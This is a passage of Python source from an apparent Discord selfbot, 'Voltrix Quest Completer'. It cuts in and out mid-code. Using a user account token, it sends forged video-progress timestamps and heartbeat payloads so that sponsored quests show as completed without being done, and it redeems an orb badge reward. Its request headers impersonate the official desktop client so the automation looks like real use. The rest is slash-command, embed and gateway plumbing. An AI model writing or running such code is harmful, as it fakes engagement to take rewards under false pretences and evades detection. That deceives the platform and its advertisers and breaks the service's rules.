            return await self._run_heartbeat(session, quest, payloads, on_update)
        if task == "STREAM_ON_DESKTOP":
            payloads = [{"stream_key": f"call:{quest.id}:1", "terminal": False}]
            return await self._run_heartbeat(session, quest, payloads, on_update)
        return {"status": "unsupported", "quest": quest, "percent": quest.progress_percent()}

    async def _run_video(self, session: aiohttp.ClientSession, quest: QuestRecord, on_update=None):
        interval = 5.0 if self.speed_mode == "fast" else 7.5
        last_good = quest.progress_value()
        import datetime as dt
        started_at = int(dt.datetime.now(dt.timezone.utc).timestamp()) - int(last_good)
        try:
            while last_good < quest.target:
                timestamp = min(float(quest.target), float(int(dt.datetime.now(dt.timezone.utc).timestamp()) - started_at))
                try:
                    data = await request_with_retry(
                        session,
                        "POST",
                        f"https://discord.com/api/v9/quests/{quest.id}/video-progress",
                        headers=self.headers,
                        json_body={"timestamp": timestamp},
                        retries=2,
                    )
                except APIError as exc:
                    if exc.status == 400:
                        status_data = await self.get_user_status(session, quest.id)
                        quest.data["user_status"] = status_data
                        last_good = max(last_good, quest.progress_value())
                        if quest.is_completed():
                            await self._emit(on_update, quest, "Completed", percent=100, status="completed")
                            return {"status": "completed", "quest": quest, "percent": 100}
                        await asyncio.sleep(1.1)
                        continue
                    raise

                if data:
                    quest.data["user_status"] = data
                last_good = max(last_good, timestamp, quest.progress_value())
                percent = min(100, int((last_good / quest.target) * 100)) if quest.target else 0
                await self._emit(on_update, quest, f"Progressing [{percent}%]", percent=percent, status="running")

                if data.get("completed_at"):
                    fresh = await self.get_user_status(session, quest.id)
                    quest.data["user_status"] = fresh
                    await self._emit(on_update, quest, "Completed", percent=100, status="completed")
                    return {"status": "completed", "quest": quest, "percent": 100}
                await asyncio.sleep(interval)
        except asyncio.CancelledError:
            await self._emit(on_update, quest, "Stopped", percent=quest.progress_percent(), status="manually_stopped")
            raise

        if quest.is_completed() or quest.progress_value() >= quest.target:
            await self._emit(on_update, quest, "Completed", percent=100, status="completed")
            return {"status": "completed", "quest": quest, "percent": 100}
        return {"status": "recovering", "quest": quest, "percent": quest.progress_percent()}

    async def _run_heartbeat(self, session: aiohttp.ClientSession, quest: QuestRecord, payloads, on_update=None):
        interval = 30 if self.speed_mode == "fast" else 40
        active_payload = payloads[0]
        last_percent = -1
        try:
            while True:
                data = None
                for payload in payloads:
                    try:
                        data = await request_with_retry(
                            session,
                            "POST",
                            f"https://discord.com/api/v9/quests/{quest.id}/heartbeat",
                            headers=self.headers,
                            json_body=payload,
                            retries=2,
                        )
                        active_payload = payload
                        break
                    except APIError:
                        continue

                if data is None:
                    try:
                        status_data = await self.get_user_status(session, quest.id)
                        quest.data["user_status"] = status_data
                    except APIError as exc:
                        if exc.status == 404:
                            await asyncio.sleep(2.0)
                            continue
                        raise
                else:
                    quest.data["user_status"] = data

                percent = quest.progress_percent()
                if percent != last_percent:
                    await self._emit(on_update, quest, f"Progressing [{percent}%]", percent=percent, status="running")
                    last_percent = percent

                if quest.is_completed() or quest.progress_value() >= quest.target:
                    break
                await asyncio.sleep(interval)
        except asyncio.CancelledError:
            await self._send_terminal(session, quest.id, active_payload)
            await self._emit(on_update, quest, "Stopped", percent=quest.progress_percent(), status="manually_stopped")
            raise

        await self._send_terminal(session, quest.id, active_payload)
        if quest.is_completed() or quest.progress_value() >= quest.target:
            await self._emit(on_update, quest, "Completed", percent=100, status="completed")
            return {"status": "completed", "quest": quest, "percent": 100}
        return {"status": "recovering", "quest": quest, "percent": quest.progress_percent()}

    async def _send_terminal(self, session: aiohttp.ClientSession, quest_id: str, payload: dict):
        terminal_payload = dict(payload)
        terminal_payload["terminal"] = True
        try:
            await request_with_retry(
                session,
                "POST",
                f"https://discord.com/api/v9/quests/{quest_id}/heartbeat",
                headers=self.headers,
                json_body=terminal_payload,
                retries=2,
            )
        except:
            pass

    async def _emit(self, callback, quest: QuestRecord, message: str, percent=None, status=None):
        if callback is None:
            return
        payload = {
            "quest_id": quest.id,
            "quest_name": quest.name,
            "percent": percent if percent is not None else quest.progress_percent(),
            "status": status or "running",
            "message": message,
            "quest": quest,
        }
        res = callback(payload)
        if asyncio.iscoroutine(res):
            await res

async def notify_quest(embed_title, description, color_hex="#00ffee"):
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
    except:
        return
    webhook_url = config.get("quest_webhook_url")
    if not webhook_url:
        return
    if not config.get("quest_notify_enabled", False):
        return

    try:
        color = int(color_hex.lstrip("#"), 16)
    except:
        color = 0x00ffee
    import datetime as dt
    payload = {
        "embeds": [
            {
                "title": embed_title,
                "description": description,
                "color": color,
                "footer": {
                    "text": "Voltrix Quest Completer"
                },
                "timestamp": dt.datetime.now(dt.timezone.utc).isoformat()
            }
        ]
    }
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(webhook_url, json=payload)
    except Exception as e:
        print(f"Error sending quest notification webhook: {e}")

active_quest_tasks = {}
active_quest_states = {}

def make_progress_bar(percent):
    filled = int(percent / 10)
    empty = 10 - filled
    return "█" * filled + "░" * empty + f" {percent}%"

def make_quest_picker_embed(quests):
    overview_emoji = UI_EMOJIS.get("overview", "")
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
    except:
        config = {}
    color_hex = config.get("embed_colour", "#00ffee")
    try:
        color = int(color_hex.lstrip("#"), 16)
    except:
        color = 0x00ffee

    quest_lines = []
    for q in quests[:10]:
        task_emoji = TASK_EMOJIS.get(q.selected_task, "")
        status_str = "Completed" if q.is_completed() else "Idle"
        quest_lines.append(f"- **{q.name}** ({task_emoji} {q.selected_task}) • `{status_str}` • `{q.progress_percent()}%`")

    embed = {
        "title": "Premium Quest Selector",
        "description": (
            f"### {overview_emoji} Available Quests\n"
            f"Found **{len(quests)}** active quest(s).\n"
            "Choose a quest from the select menu below to open the control panel.\n\n"
            "**Quests List:**\n" + "\n".join(quest_lines)
        ),
        "color": color,
        "footer": {
            "text": "Voltrix Quest Completer"
        }
    }
    return embed

def make_quest_picker_components(quests):
    options = []
    for q in quests[:25]:
        status_str = "Completed" if q.is_completed() else "Idle"
        options.append({
            "label": q.name[:100],
            "description": f"{status_str} • {q.progress_percent()}%",
            "value": q.id
        })
    
    return [
        {
            "type": 1,
            "components": [
                {
                    "type": 3,
                    "custom_id": "quest_select_menu",
                    "placeholder": "Choose a premium quest to open",
                    "options": options
                }
            ]
        }
    ]

def make_quest_control_embed(quest, status, percent, speed_mode):
    header_emoji = UI_EMOJIS.get("header", "")
    reward_emoji = UI_EMOJIS.get("reward", "")
    game_emoji = UI_EMOJIS.get("game", "")
    mode_emoji = UI_EMOJIS.get("mode", "")
    progress_emoji = UI_EMOJIS.get("progress", "")
    time_emoji = UI_EMOJIS.get("time", "")
    
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
    except:
        config = {}
    color_hex = config.get("embed_colour", "#00ffee")
    try:
        color = int(color_hex.lstrip("#"), 16)
    except:
        color = 0x00ffee

    task_emoji = TASK_EMOJIS.get(quest.selected_task, "")
    bar = make_progress_bar(percent)
    
    embed = {
        "title": f"{header_emoji} {quest.name}",
        "description": (
            f"### {UI_EMOJIS.get('overview', '')} Quest Overview\n"
            f"{reward_emoji} **Reward**: {quest.reward_name}\n"
            f"{game_emoji} **Game**: {quest.game_title}\n"
            f"{task_emoji} **Task**: {quest.selected_task}\n"
            f"{mode_emoji} **Speed Mode**: {speed_mode.title()}\n\n"
            f"### {progress_emoji} Live Progress\n"
            f"**Status**: {status.upper()}\n"
            f"**Progress**: {bar}\n"
            f"{time_emoji} **Expires**: {quest.expires_relative()}\n"
        ),
        "color": color,
        "footer": {
            "text": "Voltrix Quest Completer"
        }
    }
    if quest.image_url:
        embed["thumbnail"] = {"url": quest.image_url}
    return embed

def make_quest_control_components(quest_id, is_enrolled):
    return [
        {
            "type": 1,
            "components": [
                {"type": 2, "style": 3, "label": "Start", "custom_id": f"quest_btn_start_{quest_id}"},
                {"type": 2, "style": 2, "label": "Normal Speed", "custom_id": f"quest_btn_normal_{quest_id}"},
                {"type": 2, "style": 1, "label": "Fast Speed", "custom_id": f"quest_btn_fast_{quest_id}"},
                {"type": 2, "style": 4, "label": "Stop", "custom_id": f"quest_btn_stop_{quest_id}"},
                {"type": 2, "style": 2, "label": "Enroll", "custom_id": f"quest_btn_enroll_{quest_id}", "disabled": is_enrolled}
            ]
        }
    ]

async def send_selfapp_message(channel_id, content=None, embeds=None, components=None):
    if not os.path.exists("config/bot_config.json"):
        return None
    try:
        with open("config/bot_config.json", "r") as f:
            bot_config = json.load(f)
    except:
        return None
    bot_token = bot_config.get("BOT_TOKEN") or bot_config.get("bot_token")
    if not bot_token:
        return None

    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
    headers = {
        "Authorization": f"Bot {bot_token}",
        "Content-Type": "application/json"
    }
    payload = {}
    if content:
        payload["content"] = str(content)
    if embeds:
        payload["embeds"] = embeds
    if components:
        payload["components"] = components

    try:
        session = getattr(builtins, "selfapp_session", None)
        if session and not session.closed:
            async with session.post(url, headers=headers, json=payload) as resp:
                if resp.status in (200, 201):
                    return await resp.json()
        else:
            async with aiohttp.ClientSession() as fallback:
                async with fallback.post(url, headers=headers, json=payload) as resp:
                    if resp.status in (200, 201):
                        return await resp.json()
    except Exception as e:
        print(f"Error sending selfapp message: {e}")
    return None

async def edit_selfapp_message(channel_id, message_id, content=None, embeds=None, components=None):
    if not os.path.exists("config/bot_config.json"):
        return None
    try:
        with open("config/bot_config.json", "r") as f:
            bot_config = json.load(f)
    except:
        return None
    bot_token = bot_config.get("BOT_TOKEN") or bot_config.get("bot_token")
    if not bot_token:
        return None

    url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}"
    headers = {
        "Authorization": f"Bot {bot_token}",
        "Content-Type": "application/json"
    }
    payload = {}
    if content is not None:
        payload["content"] = str(content)
    if embeds is not None:
        payload["embeds"] = embeds
    if components is not None:
        payload["components"] = components

    try:
        session = getattr(builtins, "selfapp_session", None)
        if session and not session.closed:
            async with session.patch(url, headers=headers, json=payload) as resp:
                if resp.status == 200:
                    return await resp.json()
        else:
            async with aiohttp.ClientSession() as fallback:
                async with fallback.patch(url, headers=headers, json=payload) as resp:
                    if resp.status == 200:
                        return await resp.json()
    except Exception as e:
        print(f"Error editing selfapp message: {e}")
    return None

async def edit_interaction_response(application_id, interaction_token, embeds=None, components=None, fallback_d=None):
    """Edit the original interaction response. On Unknown Interaction/Webhook (404),
    falls back to direct channel message delivery."""
    url = f"https://discord.com/api/v10/webhooks/{application_id}/{interaction_token}/messages/@original"
    headers = {"Content-Type": "application/json"}
    payload = {}
    if embeds is not None:
        payload["embeds"] = embeds
    if components is not None:
        payload["components"] = components

    # Try up to 3 times for transient network failures
    for attempt in range(3):
        try:
            session = getattr(builtins, "selfapp_session", None)
            if session and not session.closed:
                async with session.patch(url, headers=headers, json=payload) as resp:
                    status = resp.status
                    if status in (200, 204):
                        return True
                    elif status == 429:
                        try:
                            rj = await resp.json()
                            wait = float(rj.get("retry_after", 1.0))
                        except:
                            wait = 1.5
                        print(f"[edit_interaction_response] Rate limited. Retrying after {wait}s")
                        await asyncio.sleep(wait + 0.1)
                        continue
                    else:
                        body = await resp.text()
                        print(f"[edit_interaction_response] Failed: {status} - {body}")
                        # 404 = Unknown Interaction or Unknown Webhook — token expired
                        if status == 404 and fallback_d is not None:
                            await _selfapp_fallback_deliver(fallback_d, embeds, components)
                        return False
            else:
                async with aiohttp.ClientSession() as fb_session:
                    async with fb_session.patch(url, headers=headers, json=payload) as resp:
                        status = resp.status
                        if status in (200, 204):
                            return True
                        elif status == 429:
                            try:
                                rj = await resp.json()
                                wait = float(rj.get("retry_after", 1.0))
                            except:
                                wait = 1.5
                            await asyncio.sleep(wait + 0.1)
                            continue
                        else:
                            body = await resp.text()
                            print(f"[edit_interaction_response] Failed: {status} - {body}")
                            if status == 404 and fallback_d is not None:
                                await _selfapp_fallback_deliver(fallback_d, embeds, components)
                            return False
        except Exception as e:
            print(f"[edit_interaction_response] Error (attempt {attempt+1}): {e}")
            if attempt < 2:
                await asyncio.sleep(0.5 * (attempt + 1))
            else:
                return False
    return False

async def _selfapp_fallback_deliver(d, embeds, components):
    """Fallback delivery when interaction token has expired (Unknown Interaction / Unknown Webhook).
    Sends directly to the channel (or DM if secret_mode is enabled)."""
    try:
        with open("config/bot_config.json", "r") as f:
            bot_cfg = json.load(f)
        bot_token = bot_cfg.get("BOT_TOKEN") or bot_cfg.get("bot_token")
    except:
        bot_token = None

    if not bot_token:
        print("[Selfapp Fallback] No bot token — cannot deliver fallback.")
        return

    try:
        with open("config.json", "r") as f:
            cfg = json.load(f)
    except:
        cfg = {}
    secret_mode = cfg.get("secret_mode", False)

    headers = {"Authorization": f"Bot {bot_token}", "Content-Type": "application/json"}
    payload = {}
    if embeds:
        payload["embeds"] = embeds
    if components:
        payload["components"] = components

    try:
        session = getattr(builtins, "selfapp_session", None)
        use_session = session if (session and not session.closed) else None

        if secret_mode:
            # DM the triggering user privately
            user_id = d.get("member", {}).get("user", {}).get("id") or d.get("user", {}).get("id")
            if not user_id:
                print("[Selfapp Fallback] No user ID — cannot DM.")
                return
            dm_url = "https://discord.com/api/v10/users/@me/channels"
            dm_payload = {"recipient_id": str(user_id)}

            async def _post(s):
                async with s.post(dm_url, headers=headers, json=dm_payload) as r:
                    if r.status == 200:
                        dm_chan = await r.json()
                        dm_chan_id = dm_chan["id"]
                        msg_url = f"https://discord.com/api/v10/channels/{dm_chan_id}/messages"
                        async with s.post(msg_url, headers=headers, json=payload) as r2:
                            if r2.status in (200, 201):
                                print(f"[Selfapp Fallback] ✅ Delivered via DM to user {user_id}")
                            else:
                                print(f"[Selfapp Fallback] DM send failed: {r2.status}")
                    else:
                        print(f"[Selfapp Fallback] DM channel creation failed: {r.status}")

            if use_session:
                await _post(use_session)
            else:
                async with aiohttp.ClientSession() as s:
                    await _post(s)
        else:
            # Deliver to the original channel
            channel_id = d.get("channel_id")
            if not channel_id:
                print("[Selfapp Fallback] No channel ID — cannot deliver.")
                return
            msg_url = f"https://discord.com/api/v10/channels/{channel_id}/messages"

            async def _send(s):
                async with s.post(msg_url, headers=headers, json=payload) as r:
                    if r.status in (200, 201):
                        print(f"[Selfapp Fallback] ✅ Delivered to channel {channel_id}")
                    else:
                        print(f"[Selfapp Fallback] Channel send failed: {r.status} - {await r.text()}")

            if use_session:
                await _send(use_session)
            else:
                async with aiohttp.ClientSession() as s:
                    await _send(s)

    except Exception as e:
        print(f"[Selfapp Fallback] Exception during fallback delivery: {e}")

async def run_quest_worker(application_id, interaction_token, quest_id, token, fallback_d=None):
    speed_mode = active_quest_states.get(quest_id, {}).get("speed_mode", "fast")
    service = QuestService(token, speed_mode=speed_mode)
    async with aiohttp.ClientSession() as session:
        quest = await service.refresh_quest(session, quest_id)
        if not quest:
            return
            
        async def on_update(payload):
            percent = payload["percent"]
            status = payload["status"]
            active_quest_states[quest_id] = {
                "speed_mode": service.speed_mode,
                "status": status,
                "percent": percent
            }
            embed = make_quest_control_embed(quest, status, percent, service.speed_mode)
            components = make_quest_control_components(quest_id, quest.is_enrolled())
            await edit_interaction_response(application_id, interaction_token, fallback_d=fallback_d, embeds=[embed], components=components)
            
        result = await service.run_quest(session, quest, on_update=on_update)
        
        if result and result.get("status") == "completed":
            active_quest_states[quest_id]["percent"] = 100
            active_quest_states[quest_id]["status"] = "completed"
            embed = make_quest_control_embed(quest, "completed", 100, service.speed_mode)
            components = make_quest_control_components(quest_id, quest.is_enrolled())
            await edit_interaction_response(application_id, interaction_token, fallback_d=fallback_d, embeds=[embed], components=components)
            await notify_quest(
                embed_title="Voltrix Quest Completed",
                description=f"Quest **{quest.name}** was successfully completed!\nReward: **{quest.reward_name}**"
            )

async def run_questall_flow(application_id, interaction_token, token, fallback_d=None):
    service = QuestService(token, speed_mode="fast")
    async with aiohttp.ClientSession() as session:
        quests = await service.fetch_quests(session)
        
        active_quests = [q for q in quests if not q.is_completed() and q.is_supported()]
        if not active_quests:
            embed = {
                "title": "Voltrix Questall",
                "description": "No active, unsupported, or incomplete quests found on this account.",
                "color": 0x00ffee
            }
            await edit_interaction_response(application_id, interaction_token, fallback_d=fallback_d, embeds=[embed])
            return

        for q in active_quests:
            if not q.is_enrolled():
                try:
                    await service.enroll(session, q)
                except:
                    pass

        quests = await service.fetch_quests(session)
        active_quests = [q for q in quests if not q.is_completed() and q.is_supported()]

        progress_tracker = {}
        for q in active_quests:
            progress_tracker[q.id] = {
                "name": q.name,
                "percent": q.progress_percent(),
                "status": "queued"
            }

        async def update_questall_msg():
            desc_lines = []
            for q_id, q_info in progress_tracker.items():
                bar = make_progress_bar(q_info["percent"])
                status_lbl = q_info["status"].upper()
                desc_lines.append(f"**{q_info['name']}**\nProgress: {bar} | Status: `{status_lbl}`")
            
            embed = {
                "title": "Voltrix Questall Solver",
                "description": "### Active Quests Progress\n" + "\n\n".join(desc_lines),
                "color": 0x00ffee,
                "footer": {
                    "text": "Voltrix Quest Completer"
                }
            }
            await edit_interaction_response(application_id, interaction_token, fallback_d=fallback_d, embeds=[embed])

        await update_questall_msg()

        async def run_worker(q):
            async def on_worker_update(payload):
                progress_tracker[q.id]["percent"] = payload["percent"]
                progress_tracker[q.id]["status"] = payload["status"]
                await update_questall_msg()

            try:
                progress_tracker[q.id]["status"] = "running"
                await update_questall_msg()
                res = await service.run_quest(session, q, on_update=on_worker_update)
                if res and res.get("status") == "completed":
                    progress_tracker[q.id]["percent"] = 100
                    progress_tracker[q.id]["status"] = "completed"
                    await update_questall_msg()
                    await notify_quest(
                        embed_title="Voltrix Quest Completed",
                        description=f"Quest **{q.name}** was successfully completed!\nReward: **{q.reward_name}**"
                    )
                else:
                    progress_tracker[q.id]["status"] = "failed"
                    await update_questall_msg()
            except Exception as e:
                progress_tracker[q.id]["status"] = f"error: {str(e)}"
                await update_questall_msg()

        await asyncio.gather(*(run_worker(q) for q in active_quests))

        final_lines = []
        for q_id, q_info in progress_tracker.items():
            bar = make_progress_bar(q_info["percent"])
            final_lines.append(f"**{q_info['name']}**\nProgress: {bar} | Status: `{q_info['status'].upper()}`")
        
        embed = {
            "title": "Voltrix Questall Complete",
            "description": "All eligible quest solvers have finished.\n\n" + "\n\n".join(final_lines),
            "color": 0x00ffee,
            "footer": {
                "text": "Voltrix Quest Completer"
            }
        }
        await edit_interaction_response(application_id, interaction_token, fallback_d=fallback_d, embeds=[embed])
        
        await notify_quest(
            embed_title="Voltrix Questall Finished",
            description=f"Voltrix Questall solver has finished processing **{len(active_quests)}** quests!"
        )

ORB_BADGE_SKU_ID = "1342211853484429445"
ORBCLAIM_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Discord/1.0.9215 Chrome/138.0.7204.251 Electron/37.6.0 Safari/537.36"
ORBCLAIM_SUPER_PROPERTIES = "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MjE1Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJoYXNfY2xpZW50X21vZHMiOmZhbHNlLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBkaXNjb3JkLzEuMC45MjE1IENocm9tZS8xMzguMC43MjA0LjI1MSBFbGVjdHJvbi8zNy42LjAgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjM3LjYuMCIsImNsaWVudF9idWlsZF9udW1iZXIiOjQ3MTA5MX0="
ORBCLAIM_TIMEZONE = "Asia/Calcutta"

def _orb_headers(token: str):
    return {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "authorization": token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/shop?tab=orbs",
        "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": ORBCLAIM_USER_AGENT,
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-discord-timezone": ORBCLAIM_TIMEZONE,
        "x-super-properties": ORBCLAIM_SUPER_PROPERTIES,
    }

async def _get_orb_balance(session: aiohttp.ClientSession, headers: dict):
    urls = [
        "https://discord.com/api/v9/users/@me/orbs/balance",
        "https://discord.com/api/v9/users/@me/virtual-currency/balance",
    ]
    for url in urls:
        try:
            async with session.get(url, headers=headers) as resp:
                if resp.status >= 400:
                    continue
                text = await resp.text()
                body = json.loads(text) if text else {}
                for key in ("balance", "discord_orb", "orbs", "amount", "total"):
                    value = body.get(key)
                    if isinstance(value, (int, float)):
                        return int(value)
        except Exception:
            continue
    return None

async def _claim_orb_badge(session: aiohttp.ClientSession, token: str):
    headers = _orb_headers(token)
    balance = await _get_orb_balance(session, headers)
    url = f"https://discord.com/api/v9/virtual-currency/skus/{ORB_BADGE_SKU_ID}/redeem"
    try:
        async with session.post(url, headers=headers, json={}) as resp:
            text = await resp.text()
            body = json.loads(text) if text else {}
            if resp.status in (200, 201, 204):
                return {"status": "SUCCESS", "balance": balance}
            return {"status": "FAILED", "code": resp.status, "message": body.get("message", "Redeem failed")}
    except Exception as e:
        return {"status": "FAILED", "code": "network", "message": str(e)}

class SelfAppGatewayClient:
    def __init__(self, bot_token):
        self.bot_token = bot_token
        self.ws = None
        self.heartbeat_task = None
        self.sequence = None
        self.session = None

    async def start(self):
        self.session = aiohttp.ClientSession()
        builtins.selfapp_session = self.session
        await self.register_command()
        asyncio.create_task(self.connect_loop())

    async def register_command(self):
        global selfapp_command_id, selfapp_command_version
        voltrix_cmd = {
            "name": "voltrix",
            "description": "Send a selfbot command response",
            "integration_types": [1], # User Install
            "contexts": [0, 1, 2],      # Guild, Bot DM, Private Group DM
            "options": [
                {
                    "name": "description",
                    "description": "The command response text",
                    "type": 3,
                    "required": True
                },
                {
                    "name": "header",
                    "description": "The header/title of the embed",
                    "type": 3,
                    "required": False
                },
                {
                    "name": "image",
                    "description": "Large image URL",
                    "type": 3,
                    "required": False
                },
                {
                    "name": "thumbnail",
                    "description": "Thumbnail URL",
                    "type": 3,
                    "required": False
                },
                {
                    "name": "footer",
                    "description": "Footer text",
                    "type": 3,
                    "required": False
                }
            ]
        }
        embed_cmd = {
            "name": "selfapp_embed",
            "description": "Customize your selfapp response embeds",
            "integration_types": [1],
            "contexts": [0, 1, 2]
        }

        secret_cmd = {
            "name": "secret",
            "description": "Enable or disable secret (ephemeral) response mode for SelfApp",
            "integration_types": [1],
            "contexts": [0, 1, 2],
            "options": [
                {
                    "name": "mode",
                    "description": "Choose to enable or disable secret mode",
                    "type": 3,
                    "required": True,
                    "choices": [
                        {"name": "enable", "value": "enable"},
                        {"name": "disable", "value": "disable"}
                    ]
                }
            ]
        }

        client_id = None
        try:
            import base64
            parts = self.bot_token.split(".")
            if parts:
                padded = parts[0] + "=" * (4 - len(parts[0]) % 4)
                client_id = str(int(base64.b64decode(padded).decode("utf-8", errors="ignore")))
        except Exception as e:
            print(f"[SelfAppBot] Base64 client ID parse error: {e}")

        if not client_id:
            try:
                with open("config/bot_config.json", "r") as f:
                    bot_config = json.load(f)
                    client_id = bot_config.get("CLIENT_ID") or bot_config.get("client_id")
            except:
                pass

        if not client_id:
            print("[SelfAppBot] Error: Could not find application ID for command registration.")
            return

        url = f"https://discord.com/api/v9/applications/{client_id}/commands"
        headers = {
            "Authorization": f"Bot {self.bot_token}",
            "Content-Type": "application/json"
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.put(url, headers=headers, json=[voltrix_cmd, embed_cmd, secret_cmd]) as resp:
                    if resp.status in (200, 201):
                        data = await resp.json()
                        if data and isinstance(data, list):
                            for cmd_data in data:
                                if cmd_data.get("name") == "voltrix":
                                    builtins.selfapp_command_id = cmd_data.get("id")
                                    builtins.selfapp_command_version = cmd_data.get("version")
                                    global selfapp_command_id, selfapp_command_version
                                    selfapp_command_id = builtins.selfapp_command_id
                                    selfapp_command_version = builtins.selfapp_command_version
                            print(f"SelfApp Commands registered. /voltrix ID={builtins.selfapp_command_id}")
                    else:
                        print(f"Failed to register SelfApp Commands: {resp.status} - {await resp.text()}")
        except Exception as e:
            print(f"Error registering slash commands: {e}")

    async def connect_loop(self):
        while True:
            try:
                async with self.session.ws_connect("wss://gateway.discord.gg/?v=10&encoding=json") as ws:
                    self.ws = ws
                    print("[SelfApp Gateway] Connected to gateway WebSocket.")
                    
                    async for msg in ws:
                        if msg.type == aiohttp.WSMsgType.TEXT:
                            data = json.loads(msg.data)
                            op = data.get("op")
                            
                            if op == 10: # Hello
                                heartbeat_interval = data["d"]["heartbeat_interval"] / 1000.0
                                self.heartbeat_ack = True
                                if self.heartbeat_task:
                                    self.heartbeat_task.cancel()
                                self.heartbeat_task = asyncio.create_task(self.heartbeat(heartbeat_interval))
                                
                                identify_payload = {
                                    "op": 2,
                                    "d": {
                                        "token": f"Bot {self.bot_token}",
                                        "intents": 0,
                                        "properties": {
                                            "$os": "windows",
                                            "$browser": "discord.py",
                                            "$device": "discord.py"
                                        }
                                    }
                                }
                                await ws.send_json(identify_payload)
                                
                            elif op == 1: # Heartbeat
                                await ws.send_json({"op": 1, "d": self.sequence})
                                
                            elif op == 11: # ACK
                                self.heartbeat_ack = True
                                
                            elif op == 0: # Event
                                self.sequence = data.get("s")
                                event_name = data.get("t")
                                if event_name == "INTERACTION_CREATE":
                                    asyncio.create_task(self.handle_interaction(data["d"]))
            except Exception as e:
                print(f"[SelfApp Gateway] Connection error: {e}. Reconnecting in 5s...")
                await asyncio.sleep(5)

    async def heartbeat(self, interval):
        while True:
            await asyncio.sleep(interval)
            if not getattr(self, "heartbeat_ack", True):
                print("[SelfApp Gateway] Heartbeat ACK timeout. Reconnecting...")
                if self.ws and not self.ws.closed:
                    try:
                        await self.ws.close()
                    except:
                        pass
                break
                
            self.heartbeat_ack = False
            if self.ws and not self.ws.closed:
                try:
                    await self.ws.send_json({"op": 1, "d": self.sequence})
                except:
                    break

    async def send_callback(self, interaction_id, interaction_token, payload):
        url = f"https://discord.com/api/v10/interactions/{interaction_id}/{interaction_token}/callback"
        headers = {"Content-Type": "application/json"}
        session = getattr(builtins, "selfapp_session", None)
        for attempt in range(3):
            try:
                if session and not session.closed:
                    async with session.post(url, headers=headers, json=payload) as resp:
                        if resp.status in (200, 204):
                            return
                        elif resp.status == 429:
                            try:
                                rj = await resp.json()
                                wait = float(rj.get("retry_after", 1.0))
                            except:
                                wait = 1.0
                            print(f"[SelfApp Callback] Rate limited, retrying after {wait}s")
                            await asyncio.sleep(wait + 0.1)
                            continue
                        else:
                            print(f"[SelfAppBot Callback Error] Status: {resp.status} - {await resp.text()}")
                            return
                else:
                    async with aiohttp.ClientSession() as s:
                        async with s.post(url, headers=headers, json=payload) as resp:
                            if resp.status in (200, 204):
                                return
                            elif resp.status == 429:
                                try:
                                    rj = await resp.json()
                                    wait = float(rj.get("retry_after", 1.0))
                                except:
                                    wait = 1.0
                                await asyncio.sleep(wait + 0.1)
                                continue
                            else:
                                print(f"[SelfAppBot Callback Error] Status: {resp.status} - {await resp.text()}")
                                return
            except Exception as e:
                print(f"[SelfAppBot Callback Exception] Attempt {attempt+1}: {e}")
                if attempt < 2:
                    await asyncio.sleep(0.3 * (attempt + 1))
                else:
                    return

    async def handle_interaction(self, d):
        try:
            interaction_id = d.get("id")
            interaction_token = d.get("token")
            itype = d.get("type")
            data = d.get("data", {})

            if itype == 2:
                cmd_name = data.get("name")
                if cmd_name == "secret":
                    options = data.get("options", [])
                    opts_dict = {opt["name"]: opt["value"] for opt in options}
                    mode_val = opts_dict.get("mode", "disable").lower()
                    
                    try:
                        with open('config.json', 'r') as f:
                            config = json.load(f)
                    except:
                        config = {}
                        
                    if mode_val == "enable":
                        config["secret_mode"] = True
                        msg = "✅ Secret mode has been **enabled**. All future SelfApp responses will be sent as ephemeral (secret) messages."
                    else:
                        config["secret_mode"] = False
                        msg = "❌ Secret mode has been **disabled**. All future SelfApp responses will be sent normally."
                        
                    try:
                        with open('config.json', 'w') as f:
                            json.dump(config, f, indent=4)
                    except Exception as e:
                        print(f"Error saving config.json for secret mode: {e}")
                        
                    payload = {
                        "type": 4,
                        "data": {
                            "content": msg,
                            "flags": 64
                        }
                    }
                    await self.send_callback(interaction_id, interaction_token, payload)
                    return

                elif cmd_name == "voltrix":
                    options = data.get("options", [])
                    opts_dict = {opt["name"]: opt["value"] for opt in options}
                    
                    desc = opts_dict.get("description", "")
                    header = opts_dict.get("header")
                    image = opts_dict.get("image")
                    thumbnail = opts_dict.get("thumbnail")
                    footer = opts_dict.get("footer")

                    # Read secret mode from config
                    try:
                        with open('config.json', 'r') as f:
                            config = json.load(f)
                    except:
                        config = {}
                    secret_mode = config.get("secret_mode", False)

                    # Acknowledge instantly
                    if secret_mode:
                        await self.send_callback(interaction_id, interaction_token, {"type": 5, "data": {"flags": 64}})
                    else:
                        await self.send_callback(interaction_id, interaction_token, {"type": 5})
                    
                    application_id = d.get("application_id")
                    
                    async def process_voltrix_command():
                        if desc == "__QUEST_PICKER__":
                            try:
                                with open('config.json', 'r') as f:
